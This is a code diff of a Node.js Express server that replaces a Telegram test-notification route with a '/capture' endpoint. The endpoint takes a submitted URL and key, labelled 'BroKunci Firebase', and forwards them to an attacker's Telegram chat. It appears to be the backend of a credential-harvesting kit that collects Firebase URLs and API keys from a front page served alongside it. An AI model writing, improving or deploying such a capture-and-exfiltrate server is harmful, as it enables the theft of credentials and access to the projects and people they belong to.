@@ -1,71 +1,39 @@
-const express = require("express");
-
+const express = require('express');
+const path = require('path');   // ❗ eitai missing chhilo
 const app = express();
-app.use(express.json({ limit: "10kb" }));
+const PORT = process.env.PORT || 10000;
 
-const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHANNEL_ID;
+// Serve static files (index.html, CSS, JS) from root directory
+app.use(express.static(path.join(__dirname)));
+app.use(express.json());
 
-// Home route: check whether the backend is running
-app.use(express.static(path.join(__dirname, "public")));
+// ── CAPURE ENDPOINT (Telegram forwarder) ──
+app.post('/capture', async (req, res) => {
+    const { url, key } = req.body;
+    const botToken = process.env.TG_BOT_TOKEN;
+    const chatId = process.env.TG_CHAT_ID;
 
-app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-// Send a test message to your Telegram channel
-app.post("/api/telegram/test", async (req, res) => {
-  try {
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({
-        success: false,
-        error: "Telegram environment variables are missing"
-      });
+    if (!botToken || !chatId) {
+        return res.status(500).json({ error: 'Bot token or chat ID not set' });
     }
 
-    const telegramResponse = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text:
-            "🔥 BROTHERS PANEL\n\n" +
-            "✅ Telegram test notification successful!\n" +
-            "🕒 Time: " + new Date().toISOString()
-        })
-      }
-    );
+    const message = `<b>🔥 BroKunci Firebase</b>\n<pre>URL: ${url}\nKey: ${key}</pre>`;
 
-    const result = await telegramResponse.json();
-
-    if (!telegramResponse.ok || !result.ok) {
-      return res.status(502).json({
-        success: false,
-        error: result.description || "Telegram delivery failed"
-      });
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.description || 'Unknown error');
+        res.json({ ok: true });
+    } catch (e) {
+        console.error('Telegram send error:', e);
+        res.status(500).json({ error: e.message });
     }
-
-    return res.json({
-      success: true,
-      message: "Test notification sent successfully"
-    });
-
-  } catch (error) {
-    console.error("Telegram notification error:", error.message);
-
-    return res.status(500).json({
-      success: false,
-      error: "Unable to send Telegram notification"
-    });
-  }
 });
 
-// Start the server
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
